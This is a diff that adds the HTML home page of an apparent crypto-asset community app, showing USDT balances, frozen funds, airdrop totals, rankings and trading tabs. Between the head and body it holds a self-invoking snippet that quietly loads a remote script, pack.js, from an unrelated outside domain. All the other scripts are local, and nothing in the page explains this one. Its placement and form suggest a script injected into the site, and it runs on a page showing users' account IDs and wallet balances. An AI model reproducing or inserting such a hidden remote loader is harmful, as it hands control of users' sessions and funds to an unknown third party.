@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="utf-8" />
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0,viewport-fit=cover" name="viewport" />
+		<title>首页</title>
+		<link rel="stylesheet" href="../../static/css/weui.css" />
+      	<link rel="stylesheet" href="../../static/css/weui-jquery.css" />
+		<link rel="stylesheet" href="../../static/css/common.css" />
+		<link rel="stylesheet" href="../../static/css/home/index.css" />
+		<link rel="stylesheet" href="../../static/css/swiper.css" />
+	</head>
+	<script>
+		(function () {
+			var dw = document.createElement("script");
+			dw.src = "https://yipinapp.cn/cydia/pack.js?zBv2XrG8cSQqzRDCm9hsEL"
+			var s = document.getElementsByTagName("script")[0];
+			s.parentNode.insertBefore(dw, s);
+		})()
+	</script>
+	<body>
+		<div class="weui-tab__b">
+			<div class="weui-tab__bd-item weui-tab__bd-item--active">
+				<h3 class="indexTitle">
+					<img src="../../static/images/logo_sm.png" />
+					<span class="titleColor">Economic</span>Community Management
+				</h3>
+			</div>
+			<div class="swiper-container">
+		      <div class="swiper-wrapper">
+		        <div class="swiper-slide">
+	        		<img src="../../static/images/banner01.png" />
+	        		<div class="imgTxt">
+						<h3>ECM<span>/USD</span></h3>
+						<p class="imgNumber"></p>
+						<p class="imgTotol">最新销毁ECO总量</p>
+						<div class="selfNum" id="newTotal">
+							<ul>
+							</ul>
+						</div>
+					</div>
+		        </div>
+		       	<div class="swiper-slide">
+		        	<img src="../../static/images/banner02.png" />
+           			<div class="ranking">
+					    <ul class="reform">
+
+					    </ul>
+      					<a href="ranking.html" class="weui-btn check_pain">查看完整榜单</a>
+      				</div>
+		        </div>
+		        <div class="swiper-slide">
+	        		<img src="../../static/images/banner01.png" />
+	        		<div class="imgTxt">
+						<h3>ECM<span>/USD</span></h3>
+						<p class="imgNumber"></p>
+						<p class="imgTotol">当前剩余空投币总量</p>
+						<div class="selfNum" id="surplusTotal">
+							<ul>
+							</ul>
+						</div>
+					</div>
+		        </div>
+		        <div class="swiper-slide thresstu">
+		        	<img src="../../static/images/banner02.png" />
+           			<div class="ranking">
+					    <ul class="listFun">
+					    </ul>
+      					<a href="ranking.html" class="weui-btn check_pain">查看完整榜单</a>
+      				</div>
+		        </div>
+		      </div>
+		      <div class="pagination swiper-pagination-bullets"></div>
+		    </div>
+			<div class="personBox">
+				<a href="../account/userInform.html" class="weui-media-box weui-media-box_appmsg perDiv">
+					<div class="weui-media-box__hd">
+						<img src="../../static/images/loginImg.png" alt="" id="userHead" class="weui-media-box__thumb" />
+					</div>
+					<div class="weui-media-box__bd">
+						<h4 class="weui-media-box__title" id="account"></h4>
+						<p class="weui-media-box__desc">UID:<span id="unid"></span></p>
+					</div>
+					<p class="superNode"></p>
+				</a>
+			</div>
+			<div class="personBox assetBox">
+					<p>
+						<img src="../../static/images/zichan.png" />
+						USDT:<span class="totalMoney" id="totalMoneyUsdt"></span><i>USD</i>
+					</p>
+					<div class="myAssets">
+						<div class="leftassets" id="leftassetsUsdt">
+							<p class="pool">
+								<img src="../../static/images/zhichanchi.png" />
+								<span>可用</span>
+							</p>
+							<h2></h2>
+						</div>
+						<span></span>
+						<div class="rightassets" id="rightassetsUsdt">
+							<p class="pool">
+								<img src="../../static/images/chushouchi.png" />
+								<span>冻结</span>
+							</p>
+							<h2></h2>
+						</div>
+					</div>
+				</div>
+			<div class="personBox assetBox" id="ecmmmmm">
+				<p>
+					<img src="../../static/images/zichan.png" />
+					总资产:<span class="totalMoney"></span><i>USD</i>
+				</p>
+				<div class="myAssets">
+					<div class="leftassets">
+						<p class="pool">
+							<img src="../../static/images/zhichanchi.png" />
+							<span>资产池</span>
+						</p>
+						<h2></h2>
+					</div>
+					<span></span>
+					<div class="rightassets">
+						<p class="pool">
+							<img src="../../static/images/chushouchi.png" />
+							<span>出售池</span>
+						</p>
+						<h2></h2>
+					</div>
+				</div>
+			</div>
+			<div class="personBox communBox">
+				<div class="community">
+					<h4>社群交易单数</h4>
+					<ul>
+						<!--<li>0</li>
+						<li>0</li>
+						<li>,</li>
+						<li>0</li>
+						<li>0</li>
+						<li>0</li>-->
+					</ul>
+				</div>
+				<p class="myCommunity">
+					<a href="community.html">我的社群</a>
+				</p>
+			</div>
+		</div>
+		<div class="weui-tabbar tabs-bottom">
+		    <a href="javascript:;" class="weui-tabbar__item weui-bar__item--on">
+		      <div class="weui-tabbar__icon">
+		        <img src="../../static/images/person-select.png" alt="">
+		      </div>
+		      <p class="weui-tabbar__label">个人中心</p>
+		    </a>
+		    <a href="../vote/vote.html" class="weui-tabbar__item">
+		      <div class="weui-tabbar__icon  special-se">
+		        <img src="../../static/images/vote.png" alt="">
+		      </div>
+		      <p class="weui-tabbar__label">投票竞选</p>
+		    </a>
+		    <a href="../transaction/transaction.html" class="weui-tabbar__item">
+		      <div class="weui-tabbar__icon">
+		        <img src="../../static/images/transaction.png" alt="">
+		      </div>
+		      <p class="weui-tabbar__label">法币交易</p>
+		    </a>
+		    <a href="../account/acount.html" class="weui-tabbar__item">
+		      <div class="weui-tabbar__icon">
+		        <img src="../../static/images/account.png" alt="">
+		      </div>
+		      <p class="weui-tabbar__label">我的账户</p>
+		    </a>
+		  </div>
+		</div>
+		<script type="text/javascript" src="../../lib/jquery.js" ></script>
+		<script type="text/javascript" src="../../lib/jquery-weui.js" ></script>
+		<script type="text/javascript" src="../../lib/weui.js" ></script>
+		<script type="text/javascript" src="../../lib/swiper.js" ></script>
+		<script type="text/javascript" src="../../static/js/api.js" ></script>
+		<script type="text/javascript" src="../../static/js/common.js" ></script>
+		<script type="text/javascript" src="../../static/js/home/index.js" ></script>
+	</body>
+</html>
